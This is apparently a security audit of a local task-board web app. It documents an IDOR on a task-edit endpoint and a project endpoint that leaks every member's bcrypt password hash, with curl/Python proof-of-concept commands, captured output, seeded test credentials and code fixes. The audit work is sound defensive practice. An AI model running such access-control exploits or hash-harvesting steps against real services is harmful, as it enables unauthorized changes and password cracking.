# IDOR + Password-Hash Leak Audit — with Live PoC

**Project:** taskboard
**Date:** 2026-05-13
**Findings:** Two independent, high-severity vulnerabilities reachable by any authenticated user — verified end-to-end on the running app at `http://localhost:3000`.

| ID | Title | Severity | Auth required | Exploit class |
|---|---|---|---|---|
| **A1** | Missing authorization on `PATCH /api/tasks/:id` lets any user edit any task | **High** (CWE-639 / CWE-862) | yes (any user) | IDOR / broken access control |
| **A2** | `GET /api/projects/:id` returns every member's bcrypt `passwordHash` | **Critical** (CWE-200 / CWE-256) | yes (any project member) | Sensitive data exposure |

Both findings are demonstrated against the seeded database. Neither requires SQL injection, XSS, or any other exploit chain — a routine authenticated request is enough.

---

## 1. Finding A1 — IDOR on `PATCH /api/tasks/:id`

### 1.1 Where

[src/app/api/tasks/[id]/route.ts:16-38](../src/app/api/tasks/[id]/route.ts#L16-L38):

```ts
export async function PATCH(req: NextRequest, { params }: Params) {
  const user = await getCurrentUser(req);
  if (!user) return unauthorized();

  const { id } = await params;

  const body = await req.json().catch(() => null);
  const parsed = updateTaskSchema.safeParse(body);
  if (!parsed.success) return badRequest("invalid input", parsed.error.flatten());

  const existing = await prisma.task.findUnique({ where: { id } });
  if (!existing) return notFound("task not found");

  const task = await prisma.task.update({
    where: { id },
    data: parsed.data,
    include: {
      assignee: { select: { id: true, name: true, email: true } },
    },
  });

  return NextResponse.json({ task });
}
```

The handler checks authentication, validates input, loads the task, and updates it. It **never calls `getProjectMembership`** — there is no check that the caller is a member of the task's project, nor that they have a role that permits editing.

Compare with `DELETE` in the same file at [lines 49-53](../src/app/api/tasks/[id]/route.ts#L49-L53), which does enforce both:

```ts
const membership = await getProjectMembership(user.id, existing.projectId);
if (!membership) return forbidden("you are not a member of this project");
if (!canEditTasks(membership.role)) {
  return forbidden("viewers cannot delete tasks");
}
```

So the bug is an **inconsistent enforcement** between PATCH and DELETE on the same resource — a classic copy/edit oversight.

### 1.2 Reproducible commands

```bash
# Token for dev@example.com — VIEWER on Q3 Launch ONLY (least-privileged seeded user)
DTOK=$(curl -s -X POST http://localhost:3000/api/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"email":"dev@example.com","password":"password123"}' \
  | python3 -c "import sys,json;print(json.load(sys.stdin)['token'])")

# Token for meera (admin, used to pick a task and to restore at the end)
MTOK=$(curl -s -X POST http://localhost:3000/api/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"email":"meera@taskboard.dev","password":"password123"}' \
  | python3 -c "import sys,json;print(json.load(sys.stdin)['token'])")

# A project dev is NOT a member of
ONB='cmp3q9s0f000dmh5rk1ydxe3e'  # Customer Onboarding Revamp

# Pick a task id from that project (via the legit owner)
TASK_ID=$(curl -s -H "Authorization: Bearer $MTOK" \
  "http://localhost:3000/api/projects/$ONB/tasks" \
  | python3 -c "import sys,json;print(json.load(sys.stdin)['tasks'][0]['id'])")

# Control — dev tries DELETE on that task (membership check IS present here)
curl -s -o /dev/null -w "DELETE HTTP %{http_code}\n" -X DELETE \
  -H "Authorization: Bearer $DTOK" "http://localhost:3000/api/tasks/$TASK_ID"
# Expected: HTTP 403

# Exploit — dev PATCHes the same task (membership check is MISSING here)
curl -s -X PATCH \
  -H "Authorization: Bearer $DTOK" -H 'Content-Type: application/json' \
  --data-raw '{"title":"[PWNED via IDOR] hijacked by dev","status":"done","description":"viewer-on-different-project rewrote me"}' \
  "http://localhost:3000/api/tasks/$TASK_ID"
# Expected: HTTP 200 with the rewritten task body

# Independent cross-check against the live DB
docker exec -i q-taskboard-assessment-db-1 psql -U taskboard -d taskboard \
  -c "SELECT id, project_id, title, description, status FROM tasks WHERE id='$TASK_ID';"

# Restore original state
curl -s -o /dev/null -w "restore HTTP %{http_code}\n" -X PATCH \
  -H "Authorization: Bearer $MTOK" -H 'Content-Type: application/json' \
  --data-raw '{"title":"Map current onboarding funnel","status":"todo","description":"Detail for: Map current onboarding funnel"}' \
  "http://localhost:3000/api/tasks/$TASK_ID"
```

### 1.3 Observed results

```
=== STEP 1: meera (legit admin of Onboarding) lists tasks to pick a target ===
  picked: cmp3q9s0l0017mh5rl0qgg1hy | Audit current onboarding emails | todo

=== STEP 2: CONTROL — dev tries DELETE on that task (DELETE has the membership check) ===
  HTTP 403
{"error":"you are not a member of this project"}

=== STEP 3: EXPLOIT — dev PATCHes the same task (PATCH has NO membership check) ===
  HTTP 200
  response title: [PWNED via IDOR] hijacked by dev
  response status: done

=== STEP 4: VERIFY via independent channel (direct DB) ===
            id             |        project_id         |              title               |              description               | status
---------------------------+---------------------------+----------------------------------+----------------------------------------+--------
 cmp3q9s0l0017mh5rl0qgg1hy | cmp3q9s0f000dmh5rk1ydxe3e | [PWNED via IDOR] hijacked by dev | viewer-on-different-project rewrote me | done

=== STEP 5: RESTORE original ===
  restore HTTP 200
```

Same task id, same attacker, same session token. DELETE → 403. PATCH → 200 with the row actually rewritten in the database.

### 1.4 Impact

- **Cross-tenant write.** Any authenticated user — a registered stranger, a viewer on an unrelated project, an ex-employee whose membership was revoked — can mutate any task in the database by id. Task ids are cuids, enumerable through:
  - The previously-confirmed SQL injection in [SQL_INJECTION_AUDIT.md](SQL_INJECTION_AUDIT.md) (which dumps the full `tasks` table).
  - The legitimate `GET /api/projects/:id/tasks` listing for any project the attacker can list (the project listing itself is gated by membership, but the SQLi bypasses that gate).
  - Brute-force / scrape — cuids have ~96 bits of entropy, so blind enumeration is not practical, but the SQLi path makes enumeration free.
- **Role bypass within own project.** Even staying inside the attacker's own project, a `viewer` (who is supposed to be read-only — see [canEditTasks](../src/lib/auth.ts#L55-L57)) can edit any task. The role gate is enforced on DELETE but not on PATCH.
- **Field-level mass assignment.** [updateTaskSchema](../src/schemas/task.ts#L13-L19) accepts `title`, `description`, `status`, `assigneeId`, and `position`. An attacker can:
  - Vandalize content (demonstrated above).
  - Reassign tasks to themselves or to anyone (no validation that the assignee is a project member — separate finding B1 from the previous enumeration).
  - Move a task between Kanban columns by setting `status: "done"`, faking work-completion signals.
  - Rewrite task `position` to disrupt board ordering — visible to all members.

### 1.5 Fix

Mirror the DELETE handler's authorization sequence. Three lines added to PATCH:

```ts
const existing = await prisma.task.findUnique({ where: { id } });
if (!existing) return notFound("task not found");

const membership = await getProjectMembership(user.id, existing.projectId);
if (!membership) return forbidden("you are not a member of this project");
if (!canEditTasks(membership.role)) return forbidden("viewers cannot edit tasks");

const task = await prisma.task.update({ … });
```

Belt-and-braces: extract the gate into a shared helper (`requireTaskEditAccess(user, taskId)`) so any future task-modifying route is forced through the same check.

---

## 2. Finding A2 — `passwordHash` exfil through `GET /api/projects/:id`

### 2.1 Where

[src/app/api/projects/[id]/route.ts:25-40](../src/app/api/projects/[id]/route.ts#L25-L40):

```ts
const project = await prisma.project.findUnique({
  where: { id },
  include: {
    owner: true,                                     // ← full User row
    memberships: { include: { user: true } },       // ← full User row × N
    tasks: {
      include: {
        assignee: true,                              // ← full User row
        createdBy: true,                             // ← full User row
      },
      orderBy: [{ status: "asc" }, { position: "asc" }],
    },
  },
});
```

Prisma's `include: true` selects **every column** on the joined model. The `User` model includes `passwordHash` ([prisma/schema.prisma:27](../prisma/schema.prisma#L27)). Therefore every owner, member, assignee, and task-creator returned in this response carries their bcrypt hash.

This is leaked to **any project member** through the route's only gate, which is membership ([lines 22-23](../src/app/api/projects/[id]/route.ts#L22-L23)) — not role. Viewers see the same payload as admins.

### 2.2 Reproducible commands

```bash
# Token for kavya@example.com — plain "member" role on Q3 Launch (no admin power, no exploit)
KTOK=$(curl -s -X POST http://localhost:3000/api/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"email":"kavya@example.com","password":"password123"}' \
  | python3 -c "import sys,json;print(json.load(sys.stdin)['token'])")

Q3='cmp3q9s0d0006mh5rb2djov7a'  # Q3 Launch — kavya is a member

# One legitimate GET request
curl -s -H "Authorization: Bearer $KTOK" "http://localhost:3000/api/projects/$Q3" -o /tmp/proj.json
wc -c < /tmp/proj.json   # response size

# Walk the response and list every passwordHash field
python3 <<'PY'
import json
with open('/tmp/proj.json') as f: d = json.load(f)['project']
hits = []
def walk(obj, path=""):
    if isinstance(obj, dict):
        for k,v in obj.items():
            if k == "passwordHash":
                hits.append((path, obj.get("email") or obj.get("name") or "?", v))
            walk(v, f"{path}.{k}")
    elif isinstance(obj, list):
        for i,x in enumerate(obj):
            walk(x, f"{path}[{i}]")
walk(d, "project")
print(f"total passwordHash fields leaked: {len(hits)}")
for path, who, h in hits:
    print(f"  {path:<55} {who:<25} {h}")
PY

# Cross-check vs the database directly
docker exec -i q-taskboard-assessment-db-1 psql -U taskboard -d taskboard \
  -c "SELECT email, password_hash FROM users ORDER BY email;"
```

### 2.3 Observed results

```
=== kavya (plain member) calls GET /api/projects/cmp3q9s0d0006mh5rb2djov7a ===
  response size:     7989 bytes

=== passwordHash strings found in the response: ===
  total passwordHash fields leaked: 18

  path                                                    identifier                hash
  ------------------------------------------------------------------------------------------------------------------------
  project.owner                                           meera@taskboard.dev       $2a$10$O4DvYpw6ha/7BtNtU8Ol.OacShyfcdZtfG0k3d.COwunRgZ13sJuS
  project.memberships[0].user                             meera@taskboard.dev       $2a$10$O4DvYpw6ha/7BtNtU8Ol.OacShyfcdZtfG0k3d.COwunRgZ13sJuS
  project.memberships[1].user                             arjun@taskboard.dev       $2a$10$O4DvYpw6ha/7BtNtU8Ol.OacShyfcdZtfG0k3d.COwunRgZ13sJuS
  project.memberships[2].user                             kavya@example.com         $2a$10$O4DvYpw6ha/7BtNtU8Ol.OacShyfcdZtfG0k3d.COwunRgZ13sJuS
  project.memberships[3].user                             dev@example.com           $2a$10$O4DvYpw6ha/7BtNtU8Ol.OacShyfcdZtfG0k3d.COwunRgZ13sJuS
  project.tasks[0].assignee                               kavya@example.com         $2a$10$O4DvYpw6ha/7BtNtU8Ol.OacShyfcdZtfG0k3d.COwunRgZ13sJuS
  project.tasks[0].createdBy                              meera@taskboard.dev       $2a$10$O4DvYpw6ha/7BtNtU8Ol.OacShyfcdZtfG0k3d.COwunRgZ13sJuS
  project.tasks[1].createdBy                              meera@taskboard.dev       $2a$10$O4DvYpw6ha/7BtNtU8Ol.OacShyfcdZtfG0k3d.COwunRgZ13sJuS
  project.tasks[2].assignee                               arjun@taskboard.dev       $2a$10$O4DvYpw6ha/7BtNtU8Ol.OacShyfcdZtfG0k3d.COwunRgZ13sJuS
  project.tasks[2].createdBy                              meera@taskboard.dev       $2a$10$O4DvYpw6ha/7BtNtU8Ol.OacShyfcdZtfG0k3d.COwunRgZ13sJuS
  project.tasks[3].assignee                               kavya@example.com         $2a$10$O4DvYpw6ha/7BtNtU8Ol.OacShyfcdZtfG0k3d.COwunRgZ13sJuS
  project.tasks[3].createdBy                              meera@taskboard.dev       $2a$10$O4DvYpw6ha/7BtNtU8Ol.OacShyfcdZtfG0k3d.COwunRgZ13sJuS
  project.tasks[4].assignee                               arjun@taskboard.dev       $2a$10$O4DvYpw6ha/7BtNtU8Ol.OacShyfcdZtfG0k3d.COwunRgZ13sJuS
  project.tasks[4].createdBy                              meera@taskboard.dev       $2a$10$O4DvYpw6ha/7BtNtU8Ol.OacShyfcdZtfG0k3d.COwunRgZ13sJuS
  project.tasks[5].assignee                               arjun@taskboard.dev       $2a$10$O4DvYpw6ha/7BtNtU8Ol.OacShyfcdZtfG0k3d.COwunRgZ13sJuS
  project.tasks[5].createdBy                              meera@taskboard.dev       $2a$10$O4DvYpw6ha/7BtNtU8Ol.OacShyfcdZtfG0k3d.COwunRgZ13sJuS
  project.tasks[6].assignee                               meera@taskboard.dev       $2a$10$O4DvYpw6ha/7BtNtU8Ol.OacShyfcdZtfG0k3d.COwunRgZ13sJuS
  project.tasks[6].createdBy                              meera@taskboard.dev       $2a$10$O4DvYpw6ha/7BtNtU8Ol.OacShyfcdZtfG0k3d.COwunRgZ13sJuS

=== Cross-check vs direct DB (proves bytes match) ===
        email        |                        password_hash
---------------------+--------------------------------------------------------------
 arjun@taskboard.dev | $2a$10$O4DvYpw6ha/7BtNtU8Ol.OacShyfcdZtfG0k3d.COwunRgZ13sJuS
 dev@example.com     | $2a$10$O4DvYpw6ha/7BtNtU8Ol.OacShyfcdZtfG0k3d.COwunRgZ13sJuS
 kavya@example.com   | $2a$10$O4DvYpw6ha/7BtNtU8Ol.OacShyfcdZtfG0k3d.COwunRgZ13sJuS
 lina@example.com    | $2a$10$O4DvYpw6ha/7BtNtU8Ol.OacShyfcdZtfG0k3d.COwunRgZ13sJuS
 meera@taskboard.dev | $2a$10$O4DvYpw6ha/7BtNtU8Ol.OacShyfcdZtfG0k3d.COwunRgZ13sJuS
```

One legitimate API call, no exploit, returned **18 separate `passwordHash` fields** covering every member of the project plus every task's `assignee` and `createdBy`. Each value matches the live database byte-for-byte. All five seeded hashes are identical only because [prisma/seed.ts:14](../prisma/seed.ts#L14) reuses one `bcrypt.hash("password123", 10)` call across users — a seed quirk, not part of the vulnerability.

### 2.4 Impact

- **No exploit required.** This is the response shape of a routine page load. The React frontend already calls this endpoint (see [src/app/projects/[id]/page.tsx:32](../src/app/projects/[id]/page.tsx#L32)); the hashes are simply not rendered in the UI but they're sitting in the browser's network tab and in any HTTP log.
- **Offline cracking.** bcrypt at cost 10 vs. a weak password (the seeded `password123` is in the first thousand entries of every common-password list) → cracked in milliseconds on a single GPU. Even strong passwords are within reach for a motivated attacker since the hash is leaked, not the plaintext.
- **Compounds with other findings:**
  - **+ Session-hijack vector B** ([XSS_TOKEN_AUDIT.md §9.2](XSS_TOKEN_AUDIT.md)): cracked password → real login → real JWT.
  - **+ A1 above:** an attacker logs in as the cracked user, gains all their memberships, and can now edit tasks across all of their projects through legitimate-looking routes.
  - **+ password reuse:** the cracked password is likely to work on the user's other services. Beyond the app's blast radius.
- **TypeScript types already concede the leak.** [src/types/index.ts:27](../src/types/index.ts#L27) defines `passwordHash?: string` on `ApiUser` — the frontend type model knew this field shows up. That's a strong signal this regression has been present for a while.

### 2.5 Fix

Replace the broad `include: true` joins with explicit `select` clauses:

```ts
const userSelect = { id: true, email: true, name: true } as const;

const project = await prisma.project.findUnique({
  where: { id },
  include: {
    owner: { select: userSelect },
    memberships: {
      select: {
        id: true,
        role: true,
        user: { select: userSelect },
      },
    },
    tasks: {
      include: {
        assignee: { select: userSelect },
        createdBy: { select: userSelect },
      },
      orderBy: [{ status: "asc" }, { position: "asc" }],
    },
  },
});
```

Belt-and-braces (recommended):

1. **Schema-level omit** — Prisma supports an [`omit`](https://www.prisma.io/docs/orm/prisma-client/queries/excluding-fields) configuration that hides a field from default selections everywhere. Apply it to `passwordHash`:
   ```prisma
   model User {
     // …
     passwordHash String @map("password_hash")  /// @omit
     // …
   }
   ```
   (Prisma 5.16+ has a global `omit` block in the generator; on Prisma 6 you can also use the typed-omit per-query option.) After this, even a future `include: { user: true }` cannot leak the hash.
2. **Audit every other endpoint** for the same pattern. `auth.ts`'s `getCurrentUser` already uses an explicit `select` ([src/lib/auth.ts:21](../src/lib/auth.ts#L21)) — the right pattern exists in the codebase, it just isn't applied consistently.
3. **Frontend cleanup** — remove `passwordHash?: string` from [src/types/index.ts:27](../src/types/index.ts#L27) and `ApiProjectMember.user`'s type ([line 27](../src/types/index.ts#L27)) and `ApiProjectDetail.owner` ([line 35](../src/types/index.ts#L35)) so the type system enforces that the field is not expected to round-trip.
4. **Forced reset.** Because the hashes have already been observed during this audit (and likely during normal operation by every member of every project), every existing user should be forced through a password reset once the leak is closed.

---

## 3. Combined matrix

| Test | As user | Method | URL | Body | Auth context | Expected (correct) | Observed | Status |
|---|---|---|---|---|---|---|---|---|
| A1-control | `dev@example.com` (viewer on Q3 Launch) | DELETE | `/api/tasks/<onboarding-task>` | — | not a member of Onboarding | 403 | **403** | gate enforced ✓ |
| A1-exploit | `dev@example.com` | PATCH | `/api/tasks/<onboarding-task>` | new title/status/desc | not a member of Onboarding | 403 | **200, row rewritten** | **gate missing** ✗ |
| A2-exploit | `kavya@example.com` (member of Q3 Launch) | GET | `/api/projects/<q3-launch>` | — | regular member | 200, no password material | **200 + 18 `passwordHash` fields** | **info leak** ✗ |

---

## 4. Cleanup

A1 step 5 restored the modified task to its original state — the database is back to the seeded content for that row. A2 is read-only and left no artifacts.

If you want a completely clean DB after running this report end-to-end:

```bash
docker-compose exec web npm run db:reset
```

(This drops all tables, re-runs migrations, and re-seeds — wipes the small artifacts from earlier audits as well.)

---

## 5. Suggested next actions

1. **Patch A1** by mirroring the DELETE handler's auth sequence in PATCH. Three-line change. No schema migration required.
2. **Patch A2** by replacing every `include: true` for a User on this route with `select: { id, email, name }`. Add a Prisma `omit` for `passwordHash` as a schema-level safety net.
3. **Force-reset every existing password.** Existing hashes have already been disclosed.
4. **Add a regression test** for both:
   - A test asserting that an authenticated non-member receives 403 on PATCH for a foreign task.
   - A test asserting that the JSON response of `GET /api/projects/:id` contains no string matching `^\$2[ayb]\$` (bcrypt prefix).
5. **Lint guard** — a custom no-restricted-syntax rule, or a code-review checklist item, banning bare `include: { <relation>: true }` for any model containing sensitive fields.
